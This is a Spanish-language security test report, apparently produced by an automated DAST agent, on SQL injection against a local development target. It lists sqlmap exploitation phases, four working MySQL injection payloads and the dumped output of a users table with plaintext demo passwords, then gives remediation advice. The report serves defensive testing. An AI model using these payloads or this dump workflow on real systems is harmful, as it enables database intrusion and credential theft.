# Informe de evaluación DAST - SQL Injection

Fecha: 2026-04-13T10:20:07Z
Objetivo: http://web.dev.local:8083

## Resumen ejecutivo
Se detectó una inyección SQL en el parámetro GET `id`. Se explotó con sqlmap (--batch) y se extrajeron nombres de bases de datos, el usuario actual (root@%) y se volcó la tabla `sqli_demo.users` con 8 entradas. Riesgo: alto.

## Metodología
Fase 1: Reconocimiento con curl para identificar formularios y parámetros.
Fase 2: Escaneo de vectores con sqlmap (--batch, --forms, level=2, risk=2).
Fase 3: Explotación dirigida (--current-user, --dbs, -D sqli_demo --tables y --dump).

## Vectores analizados
- GET / (form encontrado): `GET http://web.dev.local:8083?id=&Submit=Submit`

## Hallazgos
- Parámetro vulnerable: `id` (GET)
- DBMS identificado: MySQL (MariaDB fork)

Payloads detectados por sqlmap:
- Boolean-based payload:
  id=1407' AND 7069=(SELECT (CASE WHEN (7069=7069) THEN 7069 ELSE (SELECT 1087 UNION SELECT 6115) END))-- -&Submit=Submit

- Error-based payload (EXTRACTVALUE):
  id=1407' AND EXTRACTVALUE(8016,CONCAT(0x5c,0x71706b7871,(SELECT (ELT(8016=8016,1))),0x716b7a6271)) AND 'iCOw'='iCOw&Submit=Submit

- Time-based payload (SLEEP):
  id=1407' AND (SELECT 1463 FROM (SELECT(SLEEP(5)))RJLT) AND 'ISeC'='ISeC&Submit=Submit

- UNION payload:
  id=1407' UNION ALL SELECT CONCAT(0x71706b7871,0x636e584c4779744e674942485452556b70786c6e45574354425357516c4f54776e66705458497453,0x716b7a6271),NULL-- -&Submit=Submit

## Evidencia de explotación
- Usuario actual extraído:
  root@%

- Bases de datos encontradas:
  - information_schema
  - mysql
  - performance_schema
  - sqli_demo
  - sys

- Tabla volcada: `sqli_demo.users` (8 registros)

Contenido (resumen de filas extraídas):
| user_id | email               | password    | username  | last_name | first_name |
|---------|---------------------|-------------|-----------|-----------|------------|
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |

## Conclusión
El objetivo presenta una vulnerabilidad SQLi explotable en el parámetro `id`. Se demuestra impacto al obtener el usuario de la BD y volcar una tabla con credenciales en texto claro. Se recomienda parchear la aplicación: usar consultas parametrizadas (prepared statements), validar y sanitizar entradas, aplicar WAF y revisar credenciales comprometidas.

## Recomendaciones inmediatas
- Deshabilitar el parámetro vulnerable o aplicar validación estricta de tipo/longitud/charset.
- Utilizar consultas parametrizadas en todas las consultas SQL.
- Rotar contraseñas de cuentas afectadas (administrador y cualquier credencial detectada).
- Limitar privilegios de la cuenta de la aplicación en la BD.

## Archivos y evidencias guardadas
- /app/reports/target_root.html (copia del HTML)
- /app/reports/scan_vectors.txt (formularios/links detectados)
- /app/reports/sqlmap_forms_scan.txt (salida del escaneo inicial)
- /app/reports/sqlmap_exploit_scan.txt (salida explotación: current-user, dbs)
- /app/reports/sqlmap_list_tables.txt (lista de tablas en sqli_demo)
- /app/reports/sqlmap_dump_users.txt (volcado de sqli_demo.users)
- /app/reports/sqlmap_output/web.dev.local/dump/sqli_demo/users.csv (CSV completo)

---
Informe generado automáticamente por el agente DAST local.
